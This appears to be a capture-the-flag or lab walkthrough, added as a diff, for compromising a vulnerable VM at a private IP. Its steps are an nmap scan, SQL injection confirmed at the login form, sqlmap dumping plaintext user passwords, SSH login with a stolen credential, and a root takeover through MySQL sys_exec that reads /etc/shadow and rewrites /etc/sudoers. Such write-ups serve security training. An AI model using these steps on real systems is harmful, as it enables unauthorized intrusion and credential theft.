@@ -1,0 +1,112 @@
+////// NMAP //////
+Network scan on target using NMAP
+
+#nmap -sV 192.168.32.49
+
+-sV = Services and their versions
+
+Scan reports port 80 open, suggests target is hosting a web service.
+Input target address into browser.
+
+at the user login page use credentials:
+
+Username:admin
+Password:'
+
+ERROR message suggests SQL Vulnerability = Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in /var/www/checklogin.php on line 28
+Wrong Username or Password
+
+////// SQLMAP //////
+
+Using the new URL data, use SQLmap tool to scan the web app.
+
+#sqlmap -u "http://192.168.32.49/checklogin.php" --data="myusername=%27&mypassword=%27&Submit=Login" --risk=3 --level=5 --dbs
+
+-u = Specifies target URL
+--data = Data string to be passed through POST
+--risk=3 = The higher the risk the higher the detection rate, but better results
+--level=5 = Each level higher includes more scan parameters up to 5.
+--dbs = Specifies databases
+
+SQLMAP results show 3 databases, members being the most intriguing.
+
+ #sqlmap -u "http://192.168.32.49/checklogin.php" --data="myusername=%27&mypassword=%27&Submit=Login" -T members --columns
+ 
+ -T = Enumarate tables in chosen database
+ --columns = Lists columns within
+ 
+ #sqlmap -u "http://192.168.32.49/checklogin.php" --data="myusername=%27&mypassword=%27&Submit=Login" -D members --dump
+
+-D = Specifies database
+--dump = Dump data in chosen database
+
+Database: members
+Table: members
+[3 entries]
++----+-----------------+----------+
+| id | password        | username |
++----+-----------------+----------+
+| 3  | JumpUpnDown     | one      |
+| 4  | Auf!wiedersehen | two      |
+| 5  | easy1230        | three    
+
+////// SSH //////
+
+#ssh -v three@192.168.32.49
+Enter password obtained through SQLMap = easy1230
+
+-v = verbose mode
+
+Spawn interactive shell =
+#echo os.system('/bin/bash')
+
+PRIV ESC
+
+////// MYSQL //////
+Connect to MySQL database as root = 
+#mysql -u root -h localhost
+
+-u = username
+-h = hostname
+
+select version and select 'passwd' file as load_file = 
+
+#select VERSION();
+#select load_file('/etc/passwd');
+
+Copy /etc/shadow in /tmp, using the sys_exec() command:
+
+#select sys_exec("cat /etc/shadow > /tmp/shadow");
+
+set proper permissions to be able to access it:
+
+#select sys_exec("chown three /tmp/shadow");
+
+do same for sudo file:
+
+#select sys_exec("cat /etc/sudoers > /tmp/sudo");
+#select sys_exec("chown three /tmp/sudo; chmod 755 /tmp/sudo");
+#\q
+
+Edit /tmp/sudo file to add three to the sudoers, add following line:
+
+three ALL=(ALL) ALL
+
+#vi /tmp/sudo
+
+follow VI cheatsheet to correctly add line - https://ryanstutorials.net/linuxtutorial/cheatsheetvi.php
+
+Save and exit and go back to MySQL and cat the /tmp/sudo to the /etc/sudoers
+
+#mysql -u root -h localhost
+#select sys_exec('cat /tmp/sudo > /etc/sudoers');
+#\q
+
+SSH back into three, spawn shell and switch to root, using password 'easy1230' when prompted.
+
+#ssh -v three@192.168.32.49
+#echo os.system('/bin/bash')
+#sudo su
+#whoami
+
+ROOT
